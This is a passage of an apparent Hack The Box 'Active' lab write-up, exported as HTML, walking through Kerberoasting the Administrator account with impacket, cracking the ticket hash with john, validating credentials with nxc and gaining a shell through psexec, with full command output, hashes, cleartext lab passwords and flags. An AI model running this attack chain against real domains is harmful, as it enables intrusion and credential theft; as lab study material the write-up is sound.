+```">smb: \SVC_TGS\&gt; cd Desktop
+smb: \SVC_TGS\Desktop\&gt; dir
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                           AR       34  Thu Jan 29 16:00:24 2026
+
+        5217023 blocks of size 4096. 279174 blocks available
+smb: \SVC_TGS\Desktop\&gt; more user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.vs7FNe (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+smb: \SVC_TGS\Desktop\&gt; 
+</pre><pre class="hljs"><code>smb: \SVC_TGS\&gt; cd Desktop
+smb: \SVC_TGS\Desktop\&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>11:14:42 2018
+  ..                                  D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>11:14:42 2018
+  user.txt                           AR      <span class="hljs-number"> 34 </span> Thu Jan<span class="hljs-number"> 29 </span>16:00:24 2026
+
+       <span class="hljs-number"> 5217023 </span>blocks of size 4096.<span class="hljs-number"> 279174 </span>blocks available
+smb: \SVC_TGS\Desktop\&gt; more user.txt
+getting file \SVC_TGS\Desktop\user.txt of size<span class="hljs-number"> 34 </span>as /tmp/smbmore.vs7FNe (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+smb: \SVC_TGS\Desktop\&gt; 
+</code></pre></div>
+<p>The <code class="inline-code">Administrator</code> user is Kerberoastable:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ sudo impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.61.180 -request       
+[sudo] password for kali: 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-01-29 16:00:25.971334             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$56f1144615a6dec1390f03559188b1fb$29671736a9323af0cea406cc042d88153d239d2f93963a243e62422ef594d774af94a2000e9e3148784c191c1dc05cf77f0a9c42bcecd240affb88d3b189187b2c5b8de1a8fcb5408e977c50d44676cb48e2af94de62194e82e4904c9deabf750e690a63905e1f7d9e80eadfc260e01b4f8ba89d069e4391b965d732205dc99791c731fd2c2731502a6e622230a9345aecc2588f11a0974f7fe94c90031b9f975c4abc6d69dc4675bcbc28b44d8539bd74d94dce52db4dc41bc9b40d6f69d73d9745b7edd0b18b8fa401d22bc5b27683c17711e79bcc0bb8680cfd63e53585ffbe3b1e374467e4e95b88db68cb53b06fde9c98bb024891516ea844b1f1d8c32fdf85754b6b5226c1fb89250c263de5f190604d4c15c968bd030e2d2bfd75b77f4e157a3b58877b57782147e4baa465f0c9fe8323e025cb2316240087fbb105706e491f990abd51a66109ae5a9003f501a2b13478a11d1c3dab08ed2626d618a891d86ad6854e1b50d5dea64979cf70efe32d8e10f791c30aecf91f88fcba1f4fbed6bb86677d5935f138e660c7e224311033e826111d38963b0a6b9e7bef21c513b7b1a6dd254a7cc98cbf2b44794a2bdb671bdaefec004e99d86bc9d7cb6697a4ce05e050bbfd6c223dd8999878a43888e5c5135d2b6405f8d2fc3628723d6ab1841e6b81975b8c733524089016104832848b430b75d26e968911db7bc29a3411bfef0fee87fd447b5b42f62096b716200075a189fc708764c6c9b5fcb275b929b333ef85f097e786cfdc27b3a7101ada37a6b33158ffa5e9c3a967ac9d7644f2ee4da60ff05f22e93bafabb0039817759cc253c34b75c1907124fd72fdcccd29adf9a0b915c21508ddb28fd0c663da49b703ee70a9a3009ca8ee9effca19361fd12bfc674ae5c913f156f33f4a698bb0ba2f019ceccaa5cc5789400f4c878a95fcf3d5f31a18e6247cc4783ed0b9bf14783c87a361c6d318c764e379f03bb077a2d8c4420ffa5441a26215baec55e431b581a29e18988dfb5745d2869c5224d8d117e10b02094156aefb596de774a1ba376a6558ee638a8db01549b4ac50295c502762ee9f1b4d072840388cdf4ce947705cbd103cbd0cbd75556ae16b0e90cef924e3478742fc1edeae7758256acc2b5d7696bd4481e8001d3cc79dc46007ff24055bb9f76ce19bea759e07f2e1beba0eb3801025360af95e821ea508de318daa9024c5c200fa8fdb2ae27393417f6dff9a23892e89c37807</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ sudo impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.61.180 -request       
+[sudo] password for kali: 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-01-29 16:00:25.971334             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$56f1144615a6dec1390f03559188b1fb$29671736a9323af0cea406cc042d88153d239d2f93963a243e62422ef594d774af94a2000e9e3148784c191c1dc05cf77f0a9c42bcecd240affb88d3b189187b2c5b8de1a8fcb5408e977c50d44676cb48e2af94de62194e82e4904c9deabf750e690a63905e1f7d9e80eadfc260e01b4f8ba89d069e4391b965d732205dc99791c731fd2c2731502a6e622230a9345aecc2588f11a0974f7fe94c90031b9f975c4abc6d69dc4675bcbc28b44d8539bd74d94dce52db4dc41bc9b40d6f69d73d9745b7edd0b18b8fa401d22bc5b27683c17711e79bcc0bb8680cfd63e53585ffbe3b1e374467e4e95b88db68cb53b06fde9c98bb024891516ea844b1f1d8c32fdf85754b6b5226c1fb89250c263de5f190604d4c15c968bd030e2d2bfd75b77f4e157a3b58877b57782147e4baa465f0c9fe8323e025cb2316240087fbb105706e491f990abd51a66109ae5a9003f501a2b13478a11d1c3dab08ed2626d618a891d86ad6854e1b50d5dea64979cf70efe32d8e10f791c30aecf91f88fcba1f4fbed6bb86677d5935f138e660c7e224311033e826111d38963b0a6b9e7bef21c513b7b1a6dd254a7cc98cbf2b44794a2bdb671bdaefec004e99d86bc9d7cb6697a4ce05e050bbfd6c223dd8999878a43888e5c5135d2b6405f8d2fc3628723d6ab1841e6b81975b8c733524089016104832848b430b75d26e968911db7bc29a3411bfef0fee87fd447b5b42f62096b716200075a189fc708764c6c9b5fcb275b929b333ef85f097e786cfdc27b3a7101ada37a6b33158ffa5e9c3a967ac9d7644f2ee4da60ff05f22e93bafabb0039817759cc253c34b75c1907124fd72fdcccd29adf9a0b915c21508ddb28fd0c663da49b703ee70a9a3009ca8ee9effca19361fd12bfc674ae5c913f156f33f4a698bb0ba2f019ceccaa5cc5789400f4c878a95fcf3d5f31a18e6247cc4783ed0b9bf14783c87a361c6d318c764e379f03bb077a2d8c4420ffa5441a26215baec55e431b581a29e18988dfb5745d2869c5224d8d117e10b02094156aefb596de774a1ba376a6558ee638a8db01549b4ac50295c502762ee9f1b4d072840388cdf4ce947705cbd103cbd0cbd75556ae16b0e90cef924e3478742fc1edeae7758256acc2b5d7696bd4481e8001d3cc79dc46007ff24055bb9f76ce19bea759e07f2e1beba0eb3801025360af95e821ea508de318daa9024c5c200fa8fdb2ae27393417f6dff9a23892e89c37807</code></pre></div>
+<p>For some reason, the original Kerberoasting hash did not work. When requesting it for the second time, I am able to successfully crack it offline and obtain the password <code class="inline-code">Ticketmaster1968</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ cat hash.txt 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7f828e73fda0d8cebc3d8c72e89d2ff3$3d51aaf257a9fb0d0d191e672d05f2f06dac1175b53584b19ae138bd66896d675c2b4e494c857e2d63fd6e26d21a88cb07bee919caac10eac1ce9a7e48eca9052d5d82b37dfac93c452a499ec7dfbba3da642daefc0b998d3e3e136b2bf0577c3481803e1f187d957decf6910416c1d0e394106223aa41a17008d9355ca76f4c5289f6ddbf84f7ae94d7e06093a1bad4db14f16c8b18abd2a00265843e59c3f1691cb0a18a5d36a6f3fb4d8ab8b5ed426b3c4308c96a92d9ce53768b914c0fe5d71163f14d2fa22b16f5d78c8b85cbaffee28c6cfd9998e55d465bd94d382ac971085744e289f1b37f4921e6da5288fd253075a7edd7c0d858625977810a366f9ff8c2eccba70856eac793effbebb3c155bca5702a22fad6edbf2959faa04e528821d91c8be9bb25b28b42b26e8c068c78405cfb4f1f7b5a2052fae3b8e91d2ac35ecd3303ff3a93c9841df636905fe4c666383e0613b59fac12445063047336847ba1738fa9a68172a56f2aa125f4072058fc8f5e9f8480c8f35759f6752cbfc12cd6d9ff1fdda8a3164269663c7bd1feb20f22de71615fe3ca427ae9254c506e2be7894b7d2081ed3a71451b10deddf04a1a3cd2eb7cd46f3a4b46c5ded2a3d01af3a7047684c9f1516bfed519a0022b53598f744283ade01f600836678e8ee7116560abfdf4656488c2fcd05e887adb987269e9ebfdd46a903987316f2cb81151cd50ed6909815819cb7b87428ce3a1087f229ffb1ead762ba941c410cffad0aced50fd0743230e8840030e82447b7a3a89dc9399e61b39995a0a442d631e8efdda5d3286385262070705f796abfc448856f8f0a745ff9404a0b84a9147441456f78adc4c63612287a90e4208b0886104ea42257c5cd30e6ecd3960def5431f11a542b82c559c5250d21146e129d1f0e2f5b8da289f9d9c19745b612b6674a295f6edbe7ad6b8890c87bc5e652f763d9e261eac0248503802ea00f80a03a5f6cce082924a470c2c25aee717c15f63994e77845900bc42c9857acc780791bd14fe3050b245b3b90fa427882c7faaa3ced23ba329734e077e5739fd6e6b7130bc45ff8c4fe9953c49ae4c600446245314713ed220bdd8777f607abf2f5480200c1fd782c9253009740ec8e4b961ffe49f0299207ea19c2ddf1daa3aad85793e97847fe90e2980a3fc975aa80399c0a954f2d7169f7b993ec1d4dec5481b9ecf2ba8e50c76df3f7ce2628acf220606e64b192ad9e0898c094421
+                                                                                                                                                                                                                                                                                                  
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:11 DONE (2026-01-29 17:23) 0.08445g/s 889989p/s 889989c/s 889989C/s Tiffani1432..Tiago_18
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ cat hash.txt 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7f828e73fda0d8cebc3d8c72e89d2ff3$3d51aaf257a9fb0d0d191e672d05f2f06dac1175b53584b19ae138bd66896d675c2b4e494c857e2d63fd6e26d21a88cb07bee919caac10eac1ce9a7e48eca9052d5d82b37dfac93c452a499ec7dfbba3da642daefc0b998d3e3e136b2bf0577c3481803e1f187d957decf6910416c1d0e394106223aa41a17008d9355ca76f4c5289f6ddbf84f7ae94d7e06093a1bad4db14f16c8b18abd2a00265843e59c3f1691cb0a18a5d36a6f3fb4d8ab8b5ed426b3c4308c96a92d9ce53768b914c0fe5d71163f14d2fa22b16f5d78c8b85cbaffee28c6cfd9998e55d465bd94d382ac971085744e289f1b37f4921e6da5288fd253075a7edd7c0d858625977810a366f9ff8c2eccba70856eac793effbebb3c155bca5702a22fad6edbf2959faa04e528821d91c8be9bb25b28b42b26e8c068c78405cfb4f1f7b5a2052fae3b8e91d2ac35ecd3303ff3a93c9841df636905fe4c666383e0613b59fac12445063047336847ba1738fa9a68172a56f2aa125f4072058fc8f5e9f8480c8f35759f6752cbfc12cd6d9ff1fdda8a3164269663c7bd1feb20f22de71615fe3ca427ae9254c506e2be7894b7d2081ed3a71451b10deddf04a1a3cd2eb7cd46f3a4b46c5ded2a3d01af3a7047684c9f1516bfed519a0022b53598f744283ade01f600836678e8ee7116560abfdf4656488c2fcd05e887adb987269e9ebfdd46a903987316f2cb81151cd50ed6909815819cb7b87428ce3a1087f229ffb1ead762ba941c410cffad0aced50fd0743230e8840030e82447b7a3a89dc9399e61b39995a0a442d631e8efdda5d3286385262070705f796abfc448856f8f0a745ff9404a0b84a9147441456f78adc4c63612287a90e4208b0886104ea42257c5cd30e6ecd3960def5431f11a542b82c559c5250d21146e129d1f0e2f5b8da289f9d9c19745b612b6674a295f6edbe7ad6b8890c87bc5e652f763d9e261eac0248503802ea00f80a03a5f6cce082924a470c2c25aee717c15f63994e77845900bc42c9857acc780791bd14fe3050b245b3b90fa427882c7faaa3ced23ba329734e077e5739fd6e6b7130bc45ff8c4fe9953c49ae4c600446245314713ed220bdd8777f607abf2f5480200c1fd782c9253009740ec8e4b961ffe49f0299207ea19c2ddf1daa3aad85793e97847fe90e2980a3fc975aa80399c0a954f2d7169f7b993ec1d4dec5481b9ecf2ba8e50c76df3f7ce2628acf220606e64b192ad9e0898c094421
+                                                                                                                                                                                                                                                                                                  
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:11 DONE (2026-01-29 17:23) 0.08445g/s 889989p/s 889989c/s 889989C/s Tiffani1432..Tiago_18
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre></div>
+<p>And now I have valid credentials:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u Administrator -p &apos;Ticketmaster1968&apos;         
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Active]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span> -u Administrator -p <span class="hljs-string">&apos;Ticketmaster1968&apos;</span>         
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">7</span> / Server <span class="hljs-number">2008</span> R2 Build <span class="hljs-number">7601</span> x64 (name:DC) (<span class="hljs-built_in">domain</span>:active.htb) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</code></pre></div>
+<p>We can use <code class="inline-code">impacket-psexec</code> to gain access to the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ impacket-psexec Administrator:Ticketmaster1968@10.129.61.198
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.61.198.....
+[*] Found writable share ADMIN$
+[*] Uploading file oTHtLRas.exe
+[*] Opening SVCManager on 10.129.61.198.....
+[*] Creating service mgtD on 10.129.61.198.....
+[*] Starting service mgtD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::b03f:d012:35ac:3a4e
+   Link-local IPv6 Address . . . . . : fe80::b03f:d012:35ac:3a4e%11
+   IPv4 Address. . . . . . . . . . . : 10.129.61.198
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%11
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+
+C:\Windows\system32&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ impacket-psexec Administrator:Ticketmaster1968@10.129.61.198
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.61.198.....
+[*] Found writable share ADMIN$
+[*] Uploading file oTHtLRas.exe
+[*] Opening SVCManager on 10.129.61.198.....
+[*] Creating service mgtD on 10.129.61.198.....
+[*] Starting service mgtD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::b03f:d012:35ac:3a4e
+   Link-local IPv6 Address . . . . . : fe80::b03f:d012:35ac:3a4e%11
+   IPv4 Address. . . . . . . . . . . : 10.129.61.198
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%11
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+
+C:\Windows\system32&gt; 
+</code></pre></div>
+<p>The <code class="inline-code">root.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Users\Administrator\Desktop&gt; more root.txt
+4e084f946185ce4bcb1523d73a1811e7
+
+C:\Users\Administrator\Desktop&gt; 
+</pre><pre class="hljs"><code><span class="hljs-symbol">C:</span>\Users\Administrator\Desktop&gt; more root.txt
+<span class="hljs-number">4e084</span>f946185ce4bcb1523d73a1811e7
+
+<span class="hljs-symbol">C:</span>\Users\Administrator\Desktop&gt; 
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
